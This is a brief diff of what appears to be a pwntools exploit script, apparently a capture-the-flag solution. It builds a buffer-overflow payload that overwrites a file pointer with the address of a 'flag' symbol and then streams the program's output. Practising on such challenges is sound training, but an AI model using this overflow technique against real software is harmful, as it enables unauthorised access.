@@ -16,4 +16,4 @@ payload += (gen_var_locations[fp][-1] - gen_var_locations[buff][-1]) * b"a"
 payload += p32(e.symbols["flag"])
 p.sendline(payload)
 
-print(p.readlineS())
+p.stream()
